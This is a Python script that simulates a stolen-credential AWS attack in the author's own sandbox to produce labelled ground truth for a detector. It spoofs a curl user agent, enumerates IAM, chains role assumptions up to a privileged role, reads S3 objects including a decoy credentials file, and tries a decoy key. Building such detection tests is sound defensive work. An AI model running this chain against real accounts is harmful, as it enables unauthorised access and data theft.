"""Demo attack in YOUR OWN sandbox (UNC6426-inspired stolen-credential role chain).
Run it from a different network than normal work (for example a phone hotspot):
    python scripts/attack_chain.py
It writes data/ground_truth.jsonl. The detector never reads that file; only evaluate does."""
import json, time, datetime as dt
from botocore.config import Config
from botocore.exceptions import ClientError
from common import ROOT, CFG, alice_session, decoy_session, assume

ATTACKER = Config(user_agent="curl/8.4.0")       # a different client, as a stolen key would show
truth = []
def note(key, role, what):
    truth.append({"key": key, "role": role, "first_call": dt.datetime.now(dt.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"), "note": what})
    print(dt.datetime.now().strftime("%H:%M:%S"), what, key)

def try_call(fn, **kw):
    try:
        fn(**kw)
    except ClientError as e:
        print("   ", e.response["Error"]["Code"])

# 1. the victim's Role-A session exists; the attacker has stolen its temporary keys
stolen, kA = assume(alice_session(), CFG["roles"]["A"], "alice-daily")
note(kA, "pw25-Role-A", "stolen Role-A key, attacker starts using it")
iam = stolen.client("iam", config=ATTACKER); sts = stolen.client("sts", config=ATTACKER); s3 = stolen.client("s3", config=ATTACKER)
sts.get_caller_identity()
for fn in (iam.list_roles, iam.list_users, iam.list_policies, iam.list_roles, iam.list_groups, iam.list_roles):   # discovery: mostly denied
    try_call(fn); time.sleep(2)
s3.list_buckets()
time.sleep(20)
# 2. hop to Role-B
sB, kB = assume(stolen, CFG["roles"]["B"], "x", config=ATTACKER)
note(kB, "pw25-Role-B", "attacker assumed Role-B")
iamB = sB.client("iam", config=ATTACKER)
iamB.list_roles(); iamB.get_role(RoleName="pw25-Role-C")
time.sleep(20)
# 3. hop to Role-C (privileged) and read data, including a decoy
sC, kC = assume(sB, CFG["roles"]["C"], "x", config=ATTACKER)
note(kC, "pw25-Role-C", "attacker assumed Role-C (privileged)")
s3C = sC.client("s3", config=ATTACKER)
s3C.list_objects_v2(Bucket=CFG["test_bucket"])
s3C.get_object(Bucket=CFG["test_bucket"], Key="reports/jan.csv")
time.sleep(10)
s3C.get_object(Bucket=CFG["test_bucket"], Key="backup/backup-credentials.csv")
print("    read the decoy file")
# 4. optional: try the decoy key found in the 'backup' (it has no permissions)
decoy_session().client("sts", config=ATTACKER).get_caller_identity()
note(CFG["decoy_key_ids"][0], "pw25-backup-svc", "attacker tried the decoy key")
# keep the Role-B key busy for a while so later checks have something to see
for i in range(5):
    time.sleep(60); iamB.list_roles()
with open(ROOT / "data" / "ground_truth.jsonl", "a") as f:
    for t in truth:
        f.write(json.dumps(t) + "\n")
print("Ground truth appended to data/ground_truth.jsonl")
